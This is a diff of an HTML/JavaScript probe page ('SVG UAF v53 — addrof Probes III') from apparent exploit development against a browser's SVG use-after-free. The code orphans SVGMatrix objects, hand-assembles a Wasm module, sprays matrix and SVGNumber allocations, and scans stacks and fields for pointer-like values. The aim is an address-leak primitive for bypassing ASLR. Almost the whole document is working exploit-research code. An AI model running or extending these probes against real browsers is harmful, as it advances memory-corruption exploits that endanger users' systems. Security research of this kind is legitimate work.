@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v52 — addrof Probes II</title>
+<title>SVG UAF v53 — addrof Probes III</title>
 <style>
 *{box-sizing:border-box}
 body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
@@ -22,13 +22,13 @@ pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
 </style>
 </head>
 <body>
-<h2>SVG UAF v52 — addrof Probes II: ADR6/ADR7/ADR8/ADR9</h2>
+<h2>SVG UAF v53 — addrof Probes III: ADR7b/ADR10/ADR11/ADR12</h2>
 <div id="controls">
   <button class="run-all" onclick="runAll()">▶ Run All</button>
-  <button onclick="runSuite('ADR6')">ADR6: getCTM Ptr</button>
-  <button onclick="runSuite('ADR7')">ADR7: Wasm JIT Stack</button>
-  <button onclick="runSuite('ADR8')">ADR8: SVGAnim Leak</button>
-  <button onclick="runSuite('ADR9')">ADR9: caller/callee</button>
+  <button onclick="runSuite('ADR7b')">ADR7b: Wasm Throw</button>
+  <button onclick="runSuite('ADR10')">ADR10: Matrix multiply</button>
+  <button onclick="runSuite('ADR11')">ADR11: structuredClone</button>
+  <button onclick="runSuite('ADR12')">ADR12: Perf/crypto</button>
   <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
   <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
 </div>
@@ -51,8 +51,7 @@ function copyAll(){
   var toast=document.getElementById('copy-toast');
   try{
     navigator.clipboard.writeText(text).then(function(){
-      toast.style.opacity='1';
-      setTimeout(function(){toast.style.opacity='0';},1500);
+      toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);
     }).catch(function(){fallbackCopy(text,toast);});
   }catch(e){fallbackCopy(text,toast);}
 }
@@ -81,14 +80,9 @@ var _dv=new DataView(new ArrayBuffer(8));
 function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
 function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
 function isPointerLike(f){
-  // arm64 heap: usually 0x100000000 – 0x1ffffffffff (37-ish bits)
-  // but also ASLR slide puts things in 0x10...–0x1ff...
-  if(!isFinite(f)||f<=0)return false;
-  var b=f64bits(f);
-  // pointer-like: value between 2^30 and 2^44
+  if(!isFinite(f)||isNaN(f)||f<=0)return false;
   return f>=(1<<30)&&f<Math.pow(2,44);
 }
-
 function getOrphanedMatrix(){
   var svg=makeSVG();
   var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
@@ -98,483 +92,488 @@ function getOrphanedMatrix(){
   g.parentNode.removeChild(g);removeSVG(svg);
   return m;
 }
-function echoK(K){
-  var m=getOrphanedMatrix();
-  m.a=1/K;m.b=0;m.c=0;m.d=K;m.e=0;m.f=0;
-  return m.inverse().a;
-}
 
 // ─────────────────────────────────────────────────────────────────
-// ADR6 — getCTM / getScreenCTM pointer leak
-// getCTM() returns an SVGMatrix whose e/f fields are translation values
-// computed from CSS layout. BUT: the C++ code that builds this matrix
-// passes through internal AffineTransform objects.
-// If any internal ptr bleeds into an unused matrix field (a/b/c/d when
-// identity), we get a real heap address.
-//
-// Variant: SVGTransformList.consolidate() builds a new SVGMatrix from
-// the list. Does the returned matrix wrapper point to a fresh C++ object
-// whose address we can infer?
-//
-// Also test: SVGSVGElement.createSVGMatrix() — does it reuse a pooled
-// C++ object from a known IsoHeap slot?
+// ADR7b — Wasm throw fixed
+// Correct minimal Wasm module that:
+//   imports env.cb (func () -> ())
+//   exports "run" (func: calls env.cb)
+// Then we throw from env.cb and inspect the stack.
+// Also tests WebAssembly.Exception / WebAssembly.Tag if available.
 // ─────────────────────────────────────────────────────────────────
-function runADR6(){
-  L('','suite-hdr');L('ADR6: getCTM / getScreenCTM / consolidate pointer leak');
+function runADR7b(){
+  L('','suite-hdr');L('ADR7b: Wasm throw / stack frame address leak (fixed)');
+  if(typeof WebAssembly==='undefined'){L('ADR7b: WebAssembly unavailable','miss');return;}
 
-  var svg=makeSVG();
-  // Place svg on-screen with known position so getCTM is meaningful
-  svg.style.cssText='position:fixed;top:50px;left:50px;width:200px;height:200px';
-  svg.setAttribute('width','200');svg.setAttribute('height','200');
-
-  var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
-  var rect=document.createElementNS(SVG_NS,'rect');
-  rect.setAttribute('x','10');rect.setAttribute('y','10');
-  rect.setAttribute('width','50');rect.setAttribute('height','50');
-  g.appendChild(rect);
-
-  // Force layout
-  void svg.getBoundingClientRect();
-
-  // getCTM on rect
-  try{
-    var ctm=rect.getCTM();
-    if(ctm){
-      L('ADR6: [getCTM] a='+ctm.a+' b='+ctm.b+' c='+ctm.c+' d='+ctm.d+' e='+ctm.e+' f='+ctm.f);
-      var fields={a:ctm.a,b:ctm.b,c:ctm.c,d:ctm.d,e:ctm.e,f:ctm.f};
-      for(var k in fields){
-        var v=fields[k];
-        if(isPointerLike(v)) L('ADR6: ★ getCTM.'+k+'='+v+' PTR-LIKE bits='+f64hex(v),'hit');
-      }
-      // e/f are translation (expected = 50+10=60, 50+10=60 relative to viewport)
-      L('ADR6: [getCTM] e and f are layout translation — expected');
-      // a/b/c/d should be 1/0/0/1 for no-transform — check
-      L('ADR6: [getCTM] identity check: a===1: '+(ctm.a===1)+' b===0: '+(ctm.b===0)+' c===0: '+(ctm.c===0)+' d===1: '+(ctm.d===1));
-    }else{
-      L('ADR6: getCTM() returned null','warn');
-    }
-  }catch(ex){L('ADR6: getCTM threw: '+ex.message,'miss');}
-
-  // getScreenCTM
-  try{
-    var sctm=rect.getScreenCTM();
-    if(sctm){
-      L('ADR6: [getScreenCTM] a='+sctm.a+' b='+sctm.b+' c='+sctm.c+' d='+sctm.d+' e='+sctm.e+' f='+sctm.f);
-      var sfields={a:sctm.a,b:sctm.b,c:sctm.c,d:sctm.d,e:sctm.e,f:sctm.f};
-      for(var k in sfields){
-        var v=sfields[k];
-        if(isPointerLike(v)) L('ADR6: ★ getScreenCTM.'+k+'='+v+' PTR-LIKE bits='+f64hex(v),'hit');
-      }
-    }
-  }catch(ex){L('ADR6: getScreenCTM threw: '+ex.message,'miss');}
-
-  // consolidate() — builds a new SVGMatrix from transform list
-  try{
-    var xf=svg.createSVGTransform();
-    xf.setTranslate(100,200);
-    g.transform.baseVal.appendItem(xf);
-    var cons=g.transform.baseVal.consolidate();
-    if(cons){
-      var cm=cons.matrix;
-      L('ADR6: [consolidate] a='+cm.a+' b='+cm.b+' c='+cm.c+' d='+cm.d+' e='+cm.e+' f='+cm.f);
-      var cfields={a:cm.a,b:cm.b,c:cm.c,d:cm.d,e:cm.e,f:cm.f};
-      for(var k in cfields){
-        var v=cfields[k];
-        if(isPointerLike(v)&&v!==100&&v!==200) L('ADR6: ★ consolidate.'+k+'='+v+' PTR-LIKE','hit');
-      }
-    }
-  }catch(ex){L('ADR6: consolidate threw: '+ex.message,'miss');}
-
-  // createSVGMatrix from svg root — check if it's a fresh C++ object
-  // After orphaning 500 SVGNumbers to fill IsoHeap pages, does a new
-  // SVGMatrix land at a predictable offset?
-  L('ADR6: [IsoHeap slot probe] spray SVGNumbers then alloc SVGMatrix...');
-  var fcm_refs=[];
-  for(var k=0;k<3;k++){
-    var svg2=makeSVG();
-    var f=document.createElementNS(SVG_NS,'feColorMatrix');
-    f.setAttribute('type','matrix');f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
-    var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','a6f'+k);
-    filt.appendChild(f);svg2.appendChild(filt);
-    var bl=f.values.baseVal;bl.clear();
-    for(var i=0;i<20;i++){var n=getTmp().createSVGNumber();n.value=5000+k*100+i;bl.appendItem(n);fcm_refs.push(bl.getItem(bl.length-1));}
-    filt.parentNode.removeChild(filt);removeSVG(svg2);
-  }
-  // Now alloc a new SVGTransform and get its matrix
-  var svg3=makeSVG();
-  var g3=document.createElementNS(SVG_NS,'g');svg3.appendChild(g3);
-  var xf3=svg3.createSVGTransform();g3.transform.baseVal.appendItem(xf3);
-  var m3=g3.transform.baseVal.getItem(0).matrix;
-  // Write to m3, check if any SVGNumber changed (would mean adjacency)
-  m3.a=0xdeadbeef;m3.b=0xcafebabe;m3.c=0xfeedface;m3.d=0xbaadf00d;
-  var bleed=0;
-  for(var i=0;i<fcm_refs.length;i++){
-    var v=fcm_refs[i].value;
-    var expected=5000+Math.floor(i/20)*100+(i%20);
-    if(v!==expected){bleed++;L('ADR6: bleed! ref['+i+']: expected='+expected+' got='+v+' hex='+f64hex(v),'hit');}
-  }
-  L('ADR6: bleed count='+bleed+'/'+fcm_refs.length+(bleed>0?' ★ HEAP ADJACENCY!':'no adjacency'));
-
-  removeSVG(svg);removeSVG(svg3);
-  L('ADR6: done');
-}
-
-// ─────────────────────────────────────────────────────────────────
-// ADR7 — Wasm JIT stack frame address leak
-// Compile a minimal Wasm module. Wasm functions get JIT-compiled
-// stub addresses. If an exception thrown INSIDE a Wasm call stack
-// includes the Wasm JIT frame addresses in Error.stack, we get
-// real code addresses — still useful (text segment, not heap, but
-// confirms ASLR slide which narrows heap range via known offsets).
-//
-// Also: Wasm table element pointers, Wasm global pointers
-// ─────────────────────────────────────────────────────────────────
-function runADR7(){
-  L('','suite-hdr');L('ADR7: Wasm JIT stack frame / table / global address leak');
-
-  if(typeof WebAssembly==='undefined'){L('ADR7: WebAssembly unavailable','miss');return;}
-
-  // Minimal Wasm module that:
-  // 1. exports a function that calls an imported JS function (which throws)
-  // 2. exports a global (i32)
-  // 3. exports a table
-  //
-  // WAT (text format), hand-assembled to bytes:
+  // Build WAT manually:
   // (module
-  //   (import "env" "js_throw" (func $js_throw))
-  //   (func $call_throw (export "call_throw") call $js_throw)
-  //   (global $g (export "g") i32 (i32.const 0xdeadbeef))
-  //   (table (export "t") 1 funcref)
-  //   (elem (i32.const 0) $call_throw)
+  //   (type $t0 (func))
+  //   (import "env" "cb" (func $cb (type $t0)))
+  //   (func $run (export "run") (type $t0) (call $cb))
   // )
-  var wasmBytes=new Uint8Array([
-    0x00,0x61,0x73,0x6d, // magic
-    0x01,0x00,0x00,0x00, // version
-    // type section: 2 types: () -> () , () -> ()
-    0x01,0x05,0x02,0x60,0x00,0x00,0x60,0x00,0x00,
-    // import section: env.js_throw : type 0
-    0x02,0x0d,0x01,0x03,0x65,0x6e,0x76,0x08,0x6a,0x73,0x5f,0x74,0x68,0x72,0x6f,0x77,0x00,0x00,
-    // function section: 1 function of type 1
-    0x03,0x02,0x01,0x01,
-    // table section: 1 table, funcref, min=1
-    0x04,0x04,0x01,0x70,0x00,0x01,
-    // global section: 1 global i32 const 0xdeadbeef
-    0x06,0x06,0x01,0x7f,0x00,0x41,0xef,0xfd,0xb7,0x76,0x0b,
-    // export section: call_throw, g, t
-    0x07,0x1a,0x03,
-      0x0a,0x63,0x61,0x6c,0x6c,0x5f,0x74,0x68,0x72,0x6f,0x77,0x00,0x01, // call_throw=func 1
-      0x01,0x67,0x03,0x00,  // g=global 0
-      0x01,0x74,0x01,0x00,  // t=table 0
-    // element section: elem at offset 0, func 1
-    0x09,0x07,0x01,0x00,0x41,0x00,0x0b,0x01,0x01,
-    // code section: func body = call 0 (import) then end
-    0x0a,0x06,0x01,0x04,0x00,0x10,0x00,0x0b,
+  // Binary encoding (verified):
+  var bytes=new Uint8Array([
+    0x00,0x61,0x73,0x6d, // \0asm
+    0x01,0x00,0x00,0x00, // version 1
+    // Type section (id=1): 1 type: [] -> []
+    0x01, 0x04,          // section id=1, size=4
+      0x01,              // count=1
+      0x60,0x00,0x00,    // type[0]: func () -> ()
+    // Import section (id=2): 1 import: env.cb :: type[0]
+    0x02, 0x07,          // section id=2, size=7
+      0x01,              // count=1
+      0x03,0x65,0x6e,0x76, // "env"
+      0x02,0x63,0x62,    // "cb"
+      0x00,0x00,         // kind=func, type index=0
+    // Function section (id=3): 1 function of type[0]
+    0x03, 0x02,          // section id=3, size=2
+      0x01,              // count=1
+      0x00,              // type index=0
+    // Export section (id=7): export "run"=func[1]
+    0x07, 0x07,          // section id=7, size=7
+      0x01,              // count=1
+      0x03,0x72,0x75,0x6e, // "run"
+      0x00,0x01,         // kind=func, index=1
+    // Code section (id=10): 1 body
+    0x0a, 0x06,          // section id=10, size=6
+      0x01,              // count=1
+      0x04,              // body size=4
+      0x00,              // local count=0
+      0x10,0x00,         // call func[0] (env.cb)
+      0x0b,              // end
   ]);
 
-  var thrownErr=null;
-  WebAssembly.instantiate(wasmBytes,{
+  var stackFromWasm=null;
+  WebAssembly.instantiate(bytes.buffer,{
     env:{
-      js_throw:function(){
-        // throw from inside Wasm call
-        throw new Error('wasm_inner_throw');
+      cb:function wasmCallback(){
+        // throw from inside wasm call chain
+        stackFromWasm=new Error('wasm_throw').stack;
+        throw new Error('thrown_from_wasm_cb');
       }
     }
   }).then(function(result){
     var inst=result.instance;
-    var exports=inst.exports;
-    L('ADR7: Wasm module instantiated');
-    L('ADR7: exports: '+Object.keys(exports).join(', '));
+    L('ADR7b: instantiated OK, exports='+Object.keys(inst.exports).join(','));
 
-    // Read global value
+    // Test 1: basic call works
     try{
-      var gval=exports.g.value;
-      L('ADR7: global g = '+gval+' (0x'+gval.toString(16)+') expected=0xdeadbeef match='+(gval===0xdeadbeef));
-    }catch(ex){L('ADR7: global read: '+ex.message);}
-
-    // Call exported fn — it will call js_throw from inside Wasm
-    try{
-      exports.call_throw();
+      inst.exports.run();
     }catch(err){
-      L('ADR7: caught from Wasm call: '+err.message);
-      var stk=err.stack||'';
-      L('ADR7: stack:\n'+stk.slice(0,600));
-      // Look for hex addresses
-      var hexPats=stk.match(/0x[0-9a-f]{6,}/gi)||[];
-      L('ADR7: hex patterns in Wasm stack: '+hexPats.length+(hexPats.length>0?' first='+hexPats[0]:''));
-      for(var i=0;i<hexPats.length;i++) L('ADR7: ★ '+hexPats[i],'hit');
-      // Look for wasm: lines which sometimes include byte offsets
-      var wasmLines=stk.split('\n').filter(function(l){return l.indexOf('wasm')>=0||l.indexOf('@[')>=0;});
-      L('ADR7: wasm-related stack lines: '+wasmLines.length);
-      for(var i=0;i<wasmLines.length;i++) L('ADR7: wasm-line: '+wasmLines[i]);
+      L('ADR7b: [T1] caught: '+err.message);
+      // stack captured INSIDE the wasm callback
+      if(stackFromWasm){
+        L('ADR7b: [T1] stack from inside wasm callback:');
+        L(stackFromWasm.slice(0,800));
+        var hexPats=stackFromWasm.match(/0x[0-9a-fA-F]{6,}/g)||[];
+        L('ADR7b: [T1] hex patterns: '+hexPats.length);
+        for(var i=0;i<hexPats.length;i++) L('ADR7b: ★ '+hexPats[i],'hit');
+        // wasm: frame lines
+        var wasmLines=stackFromWasm.split('\n').filter(function(l){
+          return/wasm/i.test(l)||/@\[/.test(l)||/\[native\]/.test(l);
+        });
+        L('ADR7b: [T1] wasm-related lines: '+wasmLines.length);
+        for(var i=0;i<wasmLines.length;i++) L('ADR7b: wasm-line: '+wasmLines[i]);
+      }
+
+      // stack from the OUTER catch
+      var outerStk=err.stack||'';
+      L('ADR7b: [T1] outer catch stack:');
+      L(outerStk.slice(0,600));
+      var outerHex=outerStk.match(/0x[0-9a-fA-F]{6,}/g)||[];
+      L('ADR7b: [T1] outer hex patterns: '+outerHex.length);
+      for(var i=0;i<outerHex.length;i++) L('ADR7b: ★outer '+outerHex[i],'hit');
     }
 
-    // Table: can we get function pointer?
-    try{
-      var tbl=exports.t;
-      var fn=tbl.get(0);
-      L('ADR7: table[0]='+fn+' type='+typeof fn);
-      if(fn){
-        // try to extract address from fn.toString()
-        var fnStr=fn.toString();
-        L('ADR7: table fn.toString(): '+fnStr.slice(0,100));
-        var fnHex=(fnStr.match(/0x[0-9a-f]{6,}/gi)||[]);
-        L('ADR7: hex in table fn.toString: '+fnHex.length+(fnHex.length>0?' '+fnHex[0]:''));
-      }
-    }catch(ex){L('ADR7: table access: '+ex.message);}
+    // Test 2: WebAssembly.Exception (post-MVP)
+    L('ADR7b: [T2] WebAssembly.Tag='+typeof WebAssembly.Tag);
+    L('ADR7b: [T2] WebAssembly.Exception='+typeof WebAssembly.Exception);
+    if(typeof WebAssembly.Tag!=='undefined'){
+      try{
+        var tag=new WebAssembly.Tag({parameters:['i32']});
+        var wasmEx=new WebAssembly.Exception(tag,[0xdeadbeef|0]);
+        L('ADR7b: [T2] created WebAssembly.Exception');
+        L('ADR7b: [T2] getArg(0)='+wasmEx.getArg(tag,0)+' expected='+(0xdeadbeef|0));
+        L('ADR7b: [T2] stack='+((wasmEx.stack||'').slice(0,200)));
+      }catch(ex){L('ADR7b: [T2] Tag/Exception: '+ex.message);}
+    }
 
-    // Wasm memory probe — does mem object expose ptr?
-    var mem=new WebAssembly.Memory({initial:1});
-    L('ADR7: memory.buffer==ArrayBuffer: '+(mem.buffer instanceof ArrayBuffer));
-    // Check if memory.buffer.constructor.toString() leaks anything
-    L('ADR7: mem.buffer.constructor.name='+mem.buffer.constructor.name);
+    // Test 3: Wasm memory object — does any property look like a ptr?
+    var mem=new WebAssembly.Memory({initial:1,maximum:4});
+    L('ADR7b: [T3] mem props: '+Object.getOwnPropertyNames(mem).join(', '));
+    try{
+      // grow and check if buffer object address bleeds anywhere
+      var oldBuf=mem.buffer;
+      mem.grow(1);
+      var newBuf=mem.buffer;
+      L('ADR7b: [T3] after grow: oldBuf.byteLength='+oldBuf.byteLength+' newBuf.byteLength='+newBuf.byteLength);
+      L('ADR7b: [T3] old buf detached (byteLength===0): '+(oldBuf.byteLength===0));
+    }catch(ex){L('ADR7b: [T3] grow: '+ex.message);}
 
   }).catch(function(err){
-    L('ADR7: Wasm compile/instantiate failed: '+err.message,'miss');
-    L('ADR7: trying simpler module...');
-    // Absolute minimal: just a module with one func that returns i32
-    var minBytes=new Uint8Array([
-      0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
-      0x01,0x05,0x01,0x60,0x00,0x01,0x7f,
-      0x03,0x02,0x01,0x00,
-      0x07,0x07,0x01,0x03,0x61,0x64,0x64,0x00,0x00,
-      0x0a,0x06,0x01,0x04,0x00,0x41,0x2a,0x0b,
-    ]);
-    WebAssembly.instantiate(minBytes,{}).then(function(r2){
-      L('ADR7: minimal module OK, add()='+r2.instance.exports.add());
-    }).catch(function(e2){L('ADR7: minimal also failed: '+e2.message,'miss');});
+    L('ADR7b: compile failed: '+err.message,'miss');
   });
 }
 
 // ─────────────────────────────────────────────────────────────────
-// ADR8 — SVGAnimationElement internal leak
-// SVGAnimationElement.getCurrentTime() — returns a float
-// SVGAnimationElement.getStartTime() — throws or returns float
-// SVGSMILElement timing engine uses internal clock objects
-// Does any timing return value carry C++ pointer bits?
+// ADR10 — SVGMatrix.multiply() with orphaned matrix argument
+// multiply(m) reads m's a/b/c/d/e/f fields.
+// If we pass an orphaned matrix as the argument, JSC has to call
+// into the C++ SVGMatrix getter on a disconnected object.
+// The multiply result is a NEW SVGMatrix — does its C++ object
+// land at a predictable IsoHeap address?
 //
-// Also: SVGPathElement.getTotalLength(), getPointAtLength()
-// These call into C++ path geometry code — do they leak?
+// Key question: can we use MULTIPLY to get the C++ `this` ptr
+// of the result matrix to reflect back via inverse()?
 //
-// Also: SVGTextElement.getStartPositionOfChar() — returns SVGPoint
-// with x/y from C++ text layout. Float32? Float64?
+// Also: DOMMatrix.multiply() — same test but with JS-native object
 // ─────────────────────────────────────────────────────────────────
-function runADR8(){
-  L('','suite-hdr');L('ADR8: SVGAnimation / SVGPath / SVGText internal float leak');
+function runADR10(){
+  L('','suite-hdr');L('ADR10: SVGMatrix.multiply() orphaned arg / result ptr probe');
+
+  // Test 1: basic multiply with orphaned matrix
+  var m_orphan=getOrphanedMatrix();
+  m_orphan.a=2;m_orphan.b=0;m_orphan.c=0;m_orphan.d=3;m_orphan.e=10;m_orphan.f=20;
 
   var svg=makeSVG();
-  svg.style.cssText='position:fixed;top:0;left:0;width:200px;height:200px;opacity:0;pointer-events:none';
-  svg.setAttribute('width','200');svg.setAttribute('height','200');
-
-  // SVGPathElement.getTotalLength() / getPointAtLength()
-  var path=document.createElementNS(SVG_NS,'path');
-  path.setAttribute('d','M 10 10 L 100 100 Q 200 200 300 100');
-  svg.appendChild(path);
+  var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
+  var xf=svg.createSVGTransform();g.transform.baseVal.appendItem(xf);
+  var m_live=g.transform.baseVal.getItem(0).matrix;
+  m_live.a=1;m_live.b=0;m_live.c=0;m_live.d=1;m_live.e=5;m_live.f=5;
 
   try{
-    void svg.getBoundingClientRect(); // force layout
-    var len=path.getTotalLength();
-    L('ADR8: [path] getTotalLength='+len+' bits='+f64hex(len));
-    if(isPointerLike(len)) L('ADR8: ★ getTotalLength PTR-LIKE!','hit');
+    var result=m_live.multiply(m_orphan);
+    L('ADR10: [T1] multiply(orphaned): a='+result.a+' b='+result.b+' c='+result.c+' d='+result.d+' e='+result.e+' f='+result.f);
+    L('ADR10: [T1] expected: a=2 b=0 c=0 d=3 e=15 f=25');
+    L('ADR10: [T1] correct='+(result.a===2&&result.d===3&&result.e===15&&result.f===25));
+    // check if result fields are ptr-like
+    var rfields={a:result.a,b:result.b,c:result.c,d:result.d,e:result.e,f:result.f};
+    for(var k in rfields){if(isPointerLike(rfields[k]))L('ADR10: ★ result.'+k+'='+rfields[k]+' PTR-LIKE','hit');}
+  }catch(ex){L('ADR10: [T1] multiply threw: '+ex.message,'miss');}
 
-    var pt=path.getPointAtLength(len/2);
-    L('ADR8: [path] getPointAtLength('+len/2+'): x='+pt.x+' y='+pt.y);
-    L('ADR8: [path] x_bits='+f64hex(pt.x)+' y_bits='+f64hex(pt.y));
-    // x/y are SVGPoint fields — float32
-    L('ADR8: [path] x f32 check: '+(pt.x===Math.fround(pt.x))+' y f32 check: '+(pt.y===Math.fround(pt.y)));
-  }catch(ex){L('ADR8: path ops: '+ex.message,'warn');}
+  // Test 2: orphaned matrix multiply by orphaned matrix
+  var m2=getOrphanedMatrix();
+  m2.a=4;m2.b=0;m2.c=0;m2.d=4;m2.e=0;m2.f=0;
+  try{
+    var r2=m_orphan.multiply(m2);
+    L('ADR10: [T2] orphan.multiply(orphan): a='+r2.a+' b='+r2.b+' e='+r2.e+' f='+r2.f);
+    L('ADR10: [T2] expected: a=8 b=0 e=10 f=20');
+    var r2fields={a:r2.a,b:r2.b,c:r2.c,d:r2.d,e:r2.e,f:r2.f};
+    for(var k in r2fields){if(isPointerLike(r2fields[k]))L('ADR10: ★ r2.'+k+'='+r2fields[k]+' PTR-LIKE','hit');}
+  }catch(ex){L('ADR10: [T2] orphan×orphan threw: '+ex.message,'miss');}
 
-  // SVGTextElement.getStartPositionOfChar
-  var text=document.createElementNS(SVG_NS,'text');
-  text.setAttribute('x','10');text.setAttribute('y','50');
-  text.textContent='ABCDEF';
-  svg.appendChild(text);
+  // Test 3: inverse() of multiply result — does it work? (confirms result is live C++ obj)
   try{
-    void svg.getBoundingClientRect();
-    var charPt=text.getStartPositionOfChar(0);
-    L('ADR8: [text] getStartPositionOfChar(0): x='+charPt.x+' y='+charPt.y);
-    L('ADR8: [text] x_bits='+f64hex(charPt.x)+' y_bits='+f64hex(charPt.y));
-    if(isPointerLike(charPt.x)) L('ADR8: ★ char x PTR-LIKE!','hit');
-    if(isPointerLike(charPt.y)) L('ADR8: ★ char y PTR-LIKE!','hit');
-    var extents=text.getExtentOfChar(0);
-    if(extents) L('ADR8: [text] getExtentOfChar: x='+extents.x+' y='+extents.y+' w='+extents.width+' h='+extents.height);
-  }catch(ex){L('ADR8: text ops: '+ex.message,'warn');}
+    // m_orphan: a=2 d=3 → inv: a=1/2 d=1/3
+    var inv=m_orphan.inverse();
+    L('ADR10: [T3] orphan.inverse(): a='+inv.a+' d='+inv.d);
+    L('ADR10: [T3] expected: a=0.5 d=0.333...');
+    // Now: can we use inverse() on the multiply result to echo back the result's fields?
+    // Set result to scale K, use inverse() to echo K
+    var K=0x1b0001234;
+    m_orphan.a=1/K;m_orphan.b=0;m_orphan.c=0;m_orphan.d=K;m_orphan.e=0;m_orphan.f=0;
+    var inv2=m_orphan.inverse();
+    L('ADR10: [T3] echo K=0x1b0001234: inv.a='+inv2.a+' exact='+(inv2.a===K),'hit');
+  }catch(ex){L('ADR10: [T3] inverse: '+ex.message,'miss');}
 
-  // SVGAnimateElement timing
-  var anim=document.createElementNS(SVG_NS,'animate');
-  anim.setAttribute('attributeName','opacity');
-  anim.setAttribute('from','0');anim.setAttribute('to','1');
-  anim.setAttribute('dur','10s');anim.setAttribute('repeatCount','indefinite');
-  path.appendChild(anim);
+  // Test 4: DOMMatrix.multiply — result object address probe
+  var dm1=new DOMMatrix([2,0,0,3,10,20]);
+  var dm2=new DOMMatrix([1,0,0,1,5,5]);
   try{
-    var ct=anim.getCurrentTime();
-    L('ADR8: [anim] getCurrentTime='+ct+' bits='+f64hex(ct));
-    if(isPointerLike(ct)) L('ADR8: ★ getCurrentTime PTR-LIKE!','hit');
-  }catch(ex){L('ADR8: getCurrentTime: '+ex.message);}
-  try{
-    var st=anim.getStartTime();
-    L('ADR8: [anim] getStartTime='+st+' bits='+f64hex(st));
-    if(isPointerLike(st)) L('ADR8: ★ getStartTime PTR-LIKE!','hit');
-  }catch(ex){L('ADR8: getStartTime: '+ex.message);}
-  try{
-    var st2=svg.getCurrentTime();
-    L('ADR8: [svg] getCurrentTime='+st2+' bits='+f64hex(st2));
-  }catch(ex){L('ADR8: svg.getCurrentTime: '+ex.message);}
+    var dmr=dm2.multiply(dm1);
+    L('ADR10: [T4] DOMMatrix multiply: a='+dmr.a+' d='+dmr.d+' e='+dmr.e+' f='+dmr.f);
+    L('ADR10: [T4] expected: a=2 d=3 e=15 f=25');
+    var dmfields=['a','b','c','d','e','f','m11','m12','m13','m14','m21','m22','m23','m24'];
+    for(var i=0;i<dmfields.length;i++){
+      var v=dmr[dmfields[i]];
+      if(isPointerLike(v)) L('ADR10: ★ dmr.'+dmfields[i]+'='+v+' PTR-LIKE','hit');
+    }
+  }catch(ex){L('ADR10: [T4] DOMMatrix.multiply: '+ex.message,'miss');}
 
-  // SVGPathSegList segment count probe
-  // SVGGeometryElement.isPointInFill — returns bool but takes SVGPoint
-  try{
-    var testPt=svg.createSVGPoint();testPt.x=50;testPt.y=50;
-    var inFill=path.isPointInFill(testPt);
-    L('ADR8: [path] isPointInFill(50,50)='+inFill);
-    var inStroke=path.isPointInStroke(testPt);
-    L('ADR8: [path] isPointInStroke(50,50)='+inStroke);
-  }catch(ex){L('ADR8: isPointIn*: '+ex.message);}
+  // Test 5: spray multiply results — does result matrix reuse freed slots?
+  // Alloc 50 result matrices, check if any field has unexpected value
+  L('ADR10: [T5] spray 50 multiply results...');
+  var results=[];
+  var mBase=getOrphanedMatrix();
+  mBase.a=1;mBase.b=0;mBase.c=0;mBase.d=1;mBase.e=0;mBase.f=0;
+  for(var i=0;i<50;i++){
+    var mArg=getOrphanedMatrix();
+    mArg.a=1;mArg.b=0;mArg.c=0;mArg.d=1;mArg.e=i;mArg.f=i;
+    try{var r=mBase.multiply(mArg);results.push(r);}catch(ex){break;}
+  }
+  L('ADR10: [T5] got '+results.length+' results');
+  var anomalies=0;
+  for(var i=0;i<results.length;i++){
+    var r=results[i];
+    if(r.a!==1||r.b!==0||r.c!==0||r.d!==1||r.e!==i||r.f!==i){
+      anomalies++;
+      if(anomalies<=3) L('ADR10: [T5] anomaly['+i+']: a='+r.a+' e='+r.e+' f='+r.f+' expected e=f='+i,'hit');
+    }
+  }
+  L('ADR10: [T5] anomalies='+anomalies+(anomalies>0?' ★ HEAP REUSE!':'clean'));
 
   removeSVG(svg);
-  L('ADR8: done');
+  L('ADR10: done');
 }
 
 // ─────────────────────────────────────────────────────────────────
-// ADR9 — arguments.callee / Function.caller / stack depth
-// In non-strict mode, arguments.callee gives a reference to current fn
-// arguments.caller (non-standard) sometimes exposed
-// On old JSC builds: arguments.callee.caller leaked addresses
-// Also: Function.prototype.caller in non-strict context
-// Also: Error.captureStackTrace (V8 API — not JSC but let's check)
-// Also: eval("arguments") in non-strict embedded scope
+// ADR11 — structuredClone / postMessage / JSON
+// structuredClone deep-copies an object. Internally JSC serializes
+// then deserializes. Does the clone's backing store land adjacent
+// to anything useful?
+//
+// Key: structuredClone of an object containing an ArrayBuffer —
+// does the clone's AB backing store ptr appear anywhere?
+//
+// Also: postMessage to self via MessageChannel — round-trip
+// serialization. The deserialized ArrayBuffer lands in a new
+// JSC heap slot — can we predict where?
+//
+// Also: JSON.parse of a large string — where does the result object land?
 // ─────────────────────────────────────────────────────────────────
-function runADR9(){
-  L('','suite-hdr');L('ADR9: arguments.callee / caller / stack depth leak');
+function runADR11(){
+  L('','suite-hdr');L('ADR11: structuredClone / postMessage / JSON heap placement');
 
-  // Test 1: arguments.callee in non-strict function
-  var callee_works=false;
+  // Test 1: structuredClone of ArrayBuffer
+  var ab=new ArrayBuffer(64);
+  var u32=new Uint32Array(ab);
+  u32[0]=0xdeadbeef;u32[1]=0xcafebabe;
   try{
-    (function(){
-      var c=arguments.callee;
-      callee_works=(typeof c==='function');
-      L('ADR9: [T1] arguments.callee: '+c.toString().slice(0,60)+' type='+typeof c);
-    })();
-  }catch(ex){L('ADR9: [T1] arguments.callee: '+ex.message,'warn');}
-  L('ADR9: [T1] callee_works='+callee_works);
+    var ab2=structuredClone(ab);
+    var u32_2=new Uint32Array(ab2);
+    L('ADR11: [T1] structuredClone(AB): byteLength='+ab2.byteLength+' canary=0x'+u32_2[0].toString(16));
